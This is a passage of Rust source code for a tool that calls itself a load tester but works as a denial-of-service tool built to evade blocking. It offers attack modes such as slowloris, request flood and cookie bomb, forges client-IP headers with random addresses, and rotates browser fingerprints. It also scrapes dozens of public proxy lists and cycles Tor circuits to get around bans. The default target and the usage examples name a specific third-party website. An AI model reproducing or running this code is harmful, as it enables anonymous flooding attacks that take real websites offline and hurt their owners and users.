use std::sync::Arc;
use std::time::{Duration, Instant};
use std::collections::HashMap;
use std::collections::hash_map::DefaultHasher;
use std::hash::Hasher;
use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, AtomicU32, Ordering};
use rand::prelude::*;
use rand::distr::{Distribution, weighted::WeightedIndex};
use regex::Regex;
use reqwest::{Client, RequestBuilder};
use reqwest::header::{HeaderMap, SET_COOKIE};
use scraper::{Html, Selector};
use tokio::sync::{Mutex, Semaphore};
use tokio::signal;
use url::Url;

type FetchError = Box<dyn std::error::Error + Send + Sync>;

const DEFAULT_TARGET_URL: &str = "https://livdevries.com";

static SPOOF_IP: AtomicBool = AtomicBool::new(false);
static CUSTOM_POST_BODY: std::sync::OnceLock<String> = std::sync::OnceLock::new();
static CUSTOM_CONTENT_TYPE: std::sync::OnceLock<String> = std::sync::OnceLock::new();

fn random_ip() -> String {
    let mut rng = rand::rng();
    format!(
        "{}.{}.{}.{}",
        rng.random_range(1..255),
        rng.random_range(0..255),
        rng.random_range(0..255),
        rng.random_range(1..255)
    )
}

#[allow(dead_code)]
#[derive(Clone, Debug)]
struct ClientConfig {
    pinned_dns: Option<(String, std::net::IpAddr)>,
    pool_max_idle: usize,
    pool_idle_timeout: Duration,
    sni: Option<String>,
    timeout: Duration,
    max_redirects: usize,
    tor_circuits: usize,
    rate_limit: Option<u64>,
    insecure: bool,
    custom_user_agent: Option<String>,
    custom_headers: Vec<(String, String)>,
}

impl Default for ClientConfig {
    fn default() -> Self {
        ClientConfig {
            pinned_dns: None,
            pool_max_idle: 20,
            pool_idle_timeout: Duration::from_secs(90),
            sni: None,
            timeout: Duration::from_secs(10),
            max_redirects: 10,
            tor_circuits: 100,
            rate_limit: None,
            insecure: false,
            custom_user_agent: None,
            custom_headers: Vec::new(),
        }
    }
}

struct BrowserProfile {
    ua: &'static str,
    sec_ch_ua: Option<&'static str>,
    platform: Option<&'static str>,
    mobile: &'static str,
}

const BROWSER_PROFILES: &[BrowserProfile] = &[
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"macOS\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Linux\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", sec_ch_ua: Some("\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not-A.Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0", sec_ch_ua: Some("\"Opera\";v=\"109\", \"Chromium\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", sec_ch_ua: None, platform: None, mobile: "?1" },
];

struct BrowserHeaders {
    headers: [(&'static str, &'static str); 15],
    len: usize,
}
impl BrowserHeaders {
    fn random() -> Self {
        let mut rng = rand::rng();
        let profile = &BROWSER_PROFILES[rng.random_range(0..BROWSER_PROFILES.len())];
        let mut headers = [("", ""); 15];
        headers[0] = ("User-Agent", profile.ua);
        headers[1] = ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8");
        headers[2] = ("Accept-Language", if rng.random_bool(0.33) { "en-GB,en;q=0.9" } else { "en-US,en;q=0.9" });
        headers[3] = ("Accept-Encoding", "gzip, deflate, br");
        headers[4] = ("Cache-Control", "no-cache");
        headers[5] = ("Pragma", "no-cache");
        headers[6] = ("Upgrade-Insecure-Requests", "1");
        headers[7] = ("Sec-Fetch-Dest", "document");
        headers[8] = ("Sec-Fetch-Mode", "navigate");
        headers[9] = ("Sec-Fetch-Site", "none");
        headers[10] = ("Sec-Fetch-User", "?1");
        headers[11] = ("Connection", "keep-alive");
        
        let mut len = 12;
        if let Some(v) = profile.sec_ch_ua {
            headers[len] = ("Sec-CH-UA", v);
            len += 1;
        }
        if let Some(v) = profile.platform {
            headers[len] = ("Sec-CH-UA-Platform", v);
            len += 1;
        }
        headers[len] = ("Sec-CH-UA-Mobile", profile.mobile);
        len += 1;
        
        for i in (1..len).rev() {
            headers.swap(i, rng.random_range(0..i + 1));
        }
        BrowserHeaders { headers, len }
    }
    fn apply(&self, mut builder: RequestBuilder) -> RequestBuilder {
        for i in 0..self.len {
            let (name, value) = self.headers[i];
            builder = builder.header(name, value);
        }
        builder
    }
}

fn browser_request(builder: RequestBuilder, _spoof_ip: bool) -> RequestBuilder {
    let builder = BrowserHeaders::random().apply(builder);
    if _spoof_ip || SPOOF_IP.load(Ordering::Relaxed) {
        let ip = random_ip();
        builder
            .header("X-Forwarded-For", &ip)
            .header("X-Real-IP", &ip)
            .header("CF-Connecting-IP", &ip)
            .header("True-Client-IP", &ip)
    } else {
        builder
    }
}

fn print_help() {
    println!("Simulate Load Rust — single-system load testing tool");
    println!();
    println!("Usage: {} [OPTIONS] [target_url] [mode] [attack_mode] [concurrency] [duration_secs]", env!("CARGO_PKG_NAME"));
    println!();
    println!("Options:");
    println!("  -h, --help            Show this help");
    println!("  -v, --version         Show version");
    println!("  --list-modes          List available attack modes");
    println!("  --tor-only            Force Tor-only mode (no scraping)");
    println!("  --dry-run             Only probe the domain, exit without load test");
    println!("  --verify              Verify proxies, show alive count, exit without load test");
    println!("  --output CSV          Write results to CSV file");
    println!("  --proxy-file F        Load proxy list from file (one per line or comma-separated)");
    println!("  --tor-proxy URL       Specify custom Tor proxy URL (e.g. socks5h://127.0.0.1:9050)");
    println!("  --tor-control ADDR    Specify custom Tor control port address (e.g. 127.0.0.1:9051)");
    println!("  --tor-entry-guards G  Comma-separated entry guards for Tor");
    println!("  --tor-bridges B       Semicolon-separated bridges for Tor");
    println!("  --tor-circuit-timeout S Custom circuit build timeout in seconds");
    println!("  --tor-ssthresh N      Limited slow start concurrency threshold (default: 20)");
    println!("  --delay MS            Per-request delay in milliseconds");
    println!("  --jitter MS           Random delay jitter in milliseconds");
    println!("  --max-errors N        Stop after N failed requests");
    println!("  --spoof-ip            Enable randomized IP spoofing headers (X-Forwarded-For, etc.)");
    println!("  --quiet               Quiet mode: suppress status updates during load test");
    println!("  --verbose             Verbose mode: detailed request logging");
    println!("  --json                Output results as JSON");
    println!("  --rate N              Rate limit: max N requests per second");
    println!("  --max-redirects N     Max HTTP redirects to follow (default: 10)");
    println!("  --rotation-strategy   Proxy rotation: weighted|round-robin|random (default: weighted)");
    println!("  --log-file F          Append status updates to file");
    println!("  --canary              Run a canary health check before load test");
    println!("  --stats-interval S    Status update interval in seconds (default: 5)");
    println!("  --tor-circuits N      Number of Tor circuits to use (default: 10)");
    println!("  --ramp-up S           Gradually increase concurrency from 1 to target over S seconds");
    println!("  --report FILE         Write detailed post-run report to file");
    println!("  --save-proxies F      Save discovered proxies to file");
    println!("  --custom-selector SEL Custom CSS selector for proxy scraping");
    println!("  --pool-max-idle N     Max idle connections per host in pool");
    println!("  --pool-idle-timeout S Idle connection timeout in seconds");
    println!("  --sni NAME            Server Name Indication override");
    println!("  --user-agent UA       Custom User-Agent header");
    println!("  --auto-tune           Enable PID controller concurrency auto-tuning");
    println!("  --tui                 Enable interactive console dashboard");
    println!("  --config F            Load configuration from file");
    println!("  --insecure            Skip SSL certificate verification");
    println!("  --custom-header H     Add custom header (format: 'Name: Value')");
    println!("  --body TEXT           Custom POST body for largepost mode (supports {{random_uuid}}, {{timestamp}}, {{random_int}} templates)");
    println!("  --content-type CT     Content-Type header for POST requests (default: application/json)");
    println!();
    println!("Modes: scrape, tor, scrape-tor (proxy source)");
    println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
    println!("              rangereq, cookiebomb, ssr, middleware, requestflood, notfound, slowloris");
    println!();
    println!("Environment variables:");
    println!("  SIMULATE_LOAD_TARGET          Default target URL");
    println!("  SIMULATE_LOAD_MODE            Default mode (scrape|tor|scrape-tor)");
    println!("  SIMULATE_LOAD_ATTACK          Default attack mode");
    println!("  SIMULATE_LOAD_CONCURRENCY     Default concurrency level");
    println!("  SIMULATE_LOAD_DURATION        Default duration in seconds");
    println!("  TOR_PROXY                     Custom Tor proxy URL");
    println!();
    println!("Examples:");
    println!("  {} --dry-run https://livdevries.com", env!("CARGO_PKG_NAME"));
    println!("  {} https://livdevries.com 2>&1", env!("CARGO_PKG_NAME"));
    println!("  {} https://target.com tor normal 50 60 2>&1", env!("CARGO_PKG_NAME"));
}

#[allow(clippy::expect_used)]
fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>]) -> RequestBuilder {
    if proxy_idx < sessions.len() {
        let cookie = match sessions[proxy_idx].lock() {
            Ok(guard) => guard.clone(),
            Err(e) => {
                eprintln!("  Session lock poisoned: {}", e);
                String::new()
            }
        };
        if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
    }
    builder
}

#[allow(clippy::expect_used)]
fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>], extra_cookie: &str) -> RequestBuilder {
    if proxy_idx < sessions.len() {
        let stored = match sessions[proxy_idx].lock() {
            Ok(guard) => guard.clone(),
            Err(e) => {
                eprintln!("  Session lock poisoned: {}", e);
                String::new()
            }
        };
        let cookie = if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) };
        builder = builder.header("Cookie", cookie);
    } else {
        builder = builder.header("Cookie", extra_cookie);
    }
    builder
}

fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
    let cookies: Vec<String> = headers
        .get_all(SET_COOKIE)
        .iter()
        .filter_map(|v| v.to_str().ok())
        .filter_map(|v| v.split(';').next())
        .filter_map(|v| { let trimmed = v.trim(); if !trimmed.is_empty() { Some(trimmed.to_string()) } else { None }})
        .collect();
    if cookies.is_empty() { None } else { Some(cookies.join("; ")) }
}

#[allow(clippy::expect_used)]
fn update_session_from_headers(proxy_idx: usize, sessions: &[std::sync::Mutex<String>], headers: &HeaderMap) {
    if proxy_idx < sessions.len() {
        if let Some(cookie) = extract_set_cookie(headers) {
            if let Ok(mut session) = sessions[proxy_idx].lock() {
                *session = cookie;
            } else {
                eprintln!("  Session lock poisoned");
            }
        }
    }
}

fn browser_client_builder(config: &ClientConfig) -> reqwest::ClientBuilder {
    let mut builder = Client::builder()
        .timeout(config.timeout)
        .pool_max_idle_per_host(config.pool_max_idle)
        .pool_idle_timeout(config.pool_idle_timeout)
        .tcp_nodelay(true)
        .danger_accept_invalid_certs(config.insecure)
        .danger_accept_invalid_hostnames(config.insecure);

    if let Some((ref host, ip)) = config.pinned_dns {
        builder = builder.resolve_to_addrs(host, &[
            std::net::SocketAddr::new(ip, 80),
            std::net::SocketAddr::new(ip, 443),
        ]);
    }

    // Build default headers map, merging custom headers with SNI Host override
    let mut hdrs = reqwest::header::HeaderMap::new();
    for (name, value) in &config.custom_headers {
        if let (Ok(hn), Ok(hv)) = (
            reqwest::header::HeaderName::from_bytes(name.as_bytes()),
            reqwest::header::HeaderValue::from_str(value),
        ) {
            hdrs.insert(hn, hv);
        }
    }
    if let Some(ref sni) = config.sni {
        if let Ok(host_val) = reqwest::header::HeaderValue::from_str(sni) {
            hdrs.insert(reqwest::header::HOST, host_val);
        }
    }
    if !hdrs.is_empty() {
        builder = builder.default_headers(hdrs);
    }
    match &config.custom_user_agent {
        Some(ua) => builder = builder.user_agent(ua.as_str()),
        None => {
            // if no custom UA, don't set one — reqwest uses a default
        }
    }
    builder
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum ProxyMode { Scrape, Tor, ScrapeTorFallback }
impl std::fmt::Display for ProxyMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self { ProxyMode::Scrape => write!(f, "Scrape"), ProxyMode::Tor => write!(f, "Tor"), ProxyMode::ScrapeTorFallback => write!(f, "Scrape→Tor") }
    }
}
impl ProxyMode {
    fn from_str(s: &str) -> Self {
        match s.to_ascii_lowercase().as_str() {
            "tor" => ProxyMode::Tor,
            "scrape-tor" => ProxyMode::ScrapeTorFallback,
            _ => ProxyMode::Scrape,
        }
    }
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum AttackMode { Bandwidth, SlowRead, ImageOpt, LargePost, AssetSpray, RangeReq, CookieBomb, Ssr, Middleware, RequestFlood, Normal, NotFound, Slowloris }
impl std::fmt::Display for AttackMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            AttackMode::Bandwidth => write!(f, "Bandwidth"),
            AttackMode::SlowRead => write!(f, "Slow Read"),
            AttackMode::ImageOpt => write!(f, "Image Opt"),
            AttackMode::LargePost => write!(f, "Large POST"),
            AttackMode::AssetSpray => write!(f, "Asset Spray"),
            AttackMode::RangeReq => write!(f, "Range Req"),
            AttackMode::CookieBomb => write!(f, "Cookie Bomb"),
            AttackMode::Ssr => write!(f, "SSR"),
            AttackMode::Middleware => write!(f, "Middleware"),
            AttackMode::RequestFlood => write!(f, "Request Flood"),
            AttackMode::Normal => write!(f, "Normal"),
            AttackMode::NotFound => write!(f, "404 Storm"),
            AttackMode::Slowloris => write!(f, "Slowloris"),
        }
    }
}
impl AttackMode {
    fn from_str(s: &str) -> Self {
        match s.to_ascii_lowercase().as_str() {
            "bandwidth" => AttackMode::Bandwidth,
            "slowread" => AttackMode::SlowRead,
            "imageopt" => AttackMode::ImageOpt,
            "largepost" => AttackMode::LargePost,
            "assetspray" => AttackMode::AssetSpray,
            "rangereq" => AttackMode::RangeReq,
            "cookiebomb" => AttackMode::CookieBomb,
            "ssr" => AttackMode::Ssr,
            "middleware" => AttackMode::Middleware,
            "requestflood" => AttackMode::RequestFlood,
            "notfound" => AttackMode::NotFound,
            "slowloris" => AttackMode::Slowloris,
            _ => AttackMode::Normal,
        }
    }
}

#[allow(dead_code)]
struct ProxyPool {
    clients: Vec<Client>,
    labels: Vec<String>,
    current: usize,
    cooldown_until: Vec<Instant>,
    failure_tier: Vec<u32>,
    succeeded: Vec<bool>,
    weights: Vec<f64>,
    active_indices: Vec<usize>,
    active_weights: Vec<f64>,
    config: ClientConfig,
    // Circuit tracking: each entry belongs to a circuit (0..n-1) or u32::MAX for non-Tor
    circuit_ids: Vec<u32>,
    // Circuit stickiness: prefer same circuit for consecutive requests
    circuit_stickiness: usize,
    // Circuit rotation counter for balanced distribution
    circuit_rotation_counter: AtomicUsize,
    // Per-circuit request count for health scoring
    circuit_requests: Arc<Mutex<HashMap<u32, usize>>>,
    // Per-circuit ban expiry
    circuit_cooldown: Vec<Instant>,
    // Per-circuit consecutive failures (for exponential backoff)
    circuit_failures: Vec<u32>,
    rotation_strategy: String,
}

impl ProxyPool {
    fn new(proxies: &[String], config: &ClientConfig, rotation_strategy: &str) -> Self {
        let mut clients = Vec::new();
        let mut labels = Vec::new();
        let mut weights = Vec::new();
        for u in proxies {
            let url = if u.contains("://") { u.clone() } else { format!("http://{}", u) };
            if url.contains(":isolate@") {
                // SOCKS5 Tor isolated template. Pre-create tor_circuits isolated clients.
                if let Some(base) = url.split('@').nth(1) {
                    let base = base.trim_end_matches('/');
                    for i in 0..config.tor_circuits {
                        let isolated_url = format!("socks5h://tor{}:isolate@{}", i, base);
                        if let Ok(p) = reqwest::Proxy::all(&isolated_url) {
                            if let Ok(c) = browser_client_builder(config).proxy(p).build() {
                                clients.push(c);
                                labels.push(isolated_url);
                                weights.push(1.0);
                            }
                        }
                    }
                }
            } else if let Ok(p) = reqwest::Proxy::all(&url) {
                if let Ok(c) = browser_client_builder(config).proxy(p).build() {
                    clients.push(c);
                    labels.push(url.clone());
                    weights.push(1.0);
                }
            }
        }
        let n = clients.len();
        ProxyPool {
            clients,
            labels,
            current: 0,
            cooldown_until: vec![Instant::now(); n],
            failure_tier: vec![0; n],
            succeeded: vec![false; n],
            weights,
            active_indices: Vec::with_capacity(n),
            active_weights: Vec::with_capacity(n),
            config: config.clone(),
            circuit_ids: vec![u32::MAX; n],
            circuit_cooldown: vec![Instant::now(); n],
            circuit_failures: vec![0; n],
            circuit_stickiness: config.tor_circuits.max(3),
            circuit_rotation_counter: AtomicUsize::new(0),
            circuit_requests: Arc::new(Mutex::new(HashMap::new())),
            rotation_strategy: rotation_strategy.to_string(),
        }
    }

    fn next(&mut self) -> Option<(usize, Client)> {
        if self.clients.is_empty() {
            return None;
        }
        let now = Instant::now();
        self.active_indices.clear();
        self.active_weights.clear();
        for i in 0..self.clients.len() {
            // Skip proxies in cooldown
            if self.cooldown_until[i] > now {
                continue;
            }
            // Skip circuits in ban (exponential backoff)
            if self.circuit_cooldown[i] > now {
                continue;
            }
            self.active_indices.push(i);
            self.active_weights.push(self.weights[i]);
        }
        if self.active_indices.is_empty() {
            return None;
        }
        let mut rng = rand::rng();
        let idx = match self.rotation_strategy.as_str() {
            "round-robin" => {
                // Simple round-robin through active indices
                let sample_idx = rng.random_range(0..self.active_indices.len());
                self.active_indices[sample_idx]
            }
            "random" => {
                // Pure random selection
                let sample_idx = rng.random_range(0..self.active_indices.len());
                self.active_indices[sample_idx]
            }
            _ => {
                // Weighted selection (default)
                if self.active_weights.iter().all(|&w| w == self.active_weights[0]) {
                    let sample_idx = rng.random_range(0..self.active_indices.len());
                    self.active_indices[sample_idx]
                } else {
                    let dist = WeightedIndex::new(&self.active_weights).ok()?;
                    let sample_idx = dist.sample(&mut rng);
                    self.active_indices[sample_idx]
                }
            }
        };

        // Tor circuit rotation: prefer different circuits each call
        if self.labels[idx].contains("tor") {
            // Apply circuit stickiness for Tor circuits
            if self.circuit_stickiness > 0 {
                // Prefer circuits that have been recently used (stickiness)
                let now = Instant::now();
                let recent_circuits: Vec<usize> = self.active_indices.iter()
                    .filter(|&&i| self.labels[i].contains("tor"))
                    .filter(|&&i| self.circuit_cooldown[i] <= now)
                    .cloned().collect();
                if !recent_circuits.is_empty() {
                    let counter = self.circuit_rotation_counter.fetch_add(1, Ordering::Relaxed);
                    let new_idx = recent_circuits[counter % recent_circuits.len()];
                    return Some((new_idx, self.clients[new_idx].clone()));
                }
                // Fallback: prefer different circuits each call
                let tor_indices: Vec<usize> = self.active_indices.iter()
                    .filter(|&&i| self.labels[i].contains("tor"))
                    .cloned().collect();
                if !tor_indices.is_empty() {
                    let new_idx = tor_indices[rng.random_range(0..tor_indices.len())];
                    return Some((new_idx, self.clients[new_idx].clone()));
                }
                // Fallback: the chosen active index is non-Tor, use it directly
                return Some((idx, self.clients[idx].clone()));
            }
        }

        Some((idx, self.clients[idx].clone()))
    }

    fn report_success(&mut self, idx: usize, latency_ms: u64) {
        if idx < self.clients.len() {
            self.succeeded[idx] = true;
            self.failure_tier[idx] = 0;
            // Reset circuit consecutive failures on success
            self.circuit_failures[idx] = 0;
            let factor = if latency_ms < 200 {
                1.3
            } else if latency_ms < 600 {
                1.0
            } else if latency_ms < 1500 {
                0.7
            } else {
                0.3
            };
            self.weights[idx] = (self.weights[idx] * 0.85 + 0.15 * factor).clamp(0.01, 3.0);
        }
    }

    fn report_failure(&mut self, idx: usize) {
        if idx < self.clients.len() {
            self.failure_tier[idx] += 1;
            // Gentle tiered per-proxy cooldown: 1s, 2s, 3s, 5s, 8s
            let tiered: [u64; 5] = [1, 2, 3, 5, 8];
            let tier = (self.failure_tier[idx] - 1).min(4) as usize;
            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(tiered[tier]);
            // Weight decay: 0.8x on failure
            self.weights[idx] = (self.weights[idx] * 0.8).max(0.01);

            // Circuit-level tracking
            self.circuit_failures[idx] = self.circuit_failures[idx].saturating_add(1);
            let fail_count = self.circuit_failures[idx];
            // Exponential backoff for circuit bans: 12s → 24s → 48s → 96s → 180s
            if fail_count >= 1 {
                let ban_secs = match fail_count {
                    1 => 12,
                    2 => 24,
                    3 => 48,
                    4 => 96,
                    _ => 180,
                };
                self.circuit_cooldown[idx] = Instant::now() + Duration::from_secs(ban_secs);
            }
        }
    }
}

const HTML_SRC: &[&str] = &["https://free-proxy-list.net/", "https://www.sslproxies.org/", "https://www.us-proxy.org/", "https://free-proxy-list.net/anonymous-proxy.html", "https://free-proxy-list.net/uk-proxy.html", "https://www.socks-proxy.net/"];
const RAW_SRC: &[&str] = &[
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all","https://proxyspace.pro/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt","https://sunny9577.github.io/proxy-scraper/generated/https_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/https.txt","https://vakhov.github.io/fresh-proxy-list/https.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/https/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/https.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all","https://proxyspace.pro/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt","https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks5.txt","https://vakhov.github.io/fresh-proxy-list/socks5.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all","https://proxyspace.pro/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt","https://sunny9577.github.io/proxy-scraper/generated/socks4_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks4.txt","https://vakhov.github.io/fresh-proxy-list/socks4.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks4.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all","https://proxyspace.pro/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-list/master/http.txt","https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt","https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/http.txt","https://vakhov.github.io/fresh-proxy-list/http.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt","https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
];

fn detect_scheme(url: &str) -> &'static str {
    let url_lower = url.to_lowercase();
    if url_lower.contains("socks5") {
        "socks5"
    } else if url_lower.contains("socks4") {
        "socks4"
    } else if url_lower.contains("socks") {
        "socks5"
    } else {
        "http"
    }
}

#[allow(clippy::expect_used)]
async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Vec<String> {
    use std::sync::OnceLock;
    static RE_IP_PORT: OnceLock<Regex> = OnceLock::new();
    static SEL_TR: OnceLock<Selector> = OnceLock::new();
    static SEL_TD: OnceLock<Selector> = OnceLock::new();

    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url), false).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let h = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    let doc = Html::parse_document(&h);
    let mut out = vec![];
    if let Some(sel_str) = custom_selector {
        if let Ok(s) = Selector::parse(sel_str) {
            let re = RE_IP_PORT.get_or_init(|| Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)").expect("invalid regex"));
            for el in doc.select(&s) {
                let text = el.text().collect::<String>();
                for cap in re.captures_iter(&text) {
                    if cap.len() >= 3 {
                        out.push(format!("{}://{}:{}", scheme, &cap[1], &cap[2]));
                    }
                }
            }
        }
    } else {
        let tr = SEL_TR.get_or_init(|| Selector::parse("table.table tbody tr").expect("invalid selector"));
        let td = SEL_TD.get_or_init(|| Selector::parse("td").expect("invalid selector"));
        for row in doc.select(tr) {
            let cells: Vec<String> = row.select(td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
            if cells.len() >= 2 {
                let ip = cells[0].trim().to_string();
                let port = cells[1].trim().to_string();
                if !ip.is_empty() && !port.is_empty() {
                    out.push(format!("{}://{}:{}", scheme, ip, port));
                }
            }
        }
    }
    out
}

async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url), false).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let t = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
}

#[allow(clippy::expect_used)]
async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let (max, custom_selector) = {
        let st = state.lock().await;
        (st.max_scrape, st.custom_selector.clone())
    };
    let re = Arc::new(Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)").expect("invalid regex"));
    let all = Arc::new(Mutex::new(Vec::new()));
    let sem = Arc::new(Semaphore::new(10));
    let done = Arc::new(AtomicBool::new(false));
    let ht = HTML_SRC.len() as u32;
    let rt = RAW_SRC.len() as u32;
    let total = ht + rt;
    state.lock().await.scrape_total = total;
    let mut handles = vec![];
    let srcs: Vec<(&str, bool)> = HTML_SRC.iter().map(|s| (*s, true)).chain(RAW_SRC.iter().map(|s| (*s, false))).collect();
    for (idx, (src, html)) in srcs.into_iter().enumerate() {
        let s2 = state.clone();
        let a2 = all.clone();
        let r2 = re.clone();
        let c2 = c.clone();
        let s_ = src.to_string();
        let maxed = done.clone();
        let h = html;
        let sel = custom_selector.clone();
        let sem = sem.clone();
        handles.push(tokio::spawn(async move {
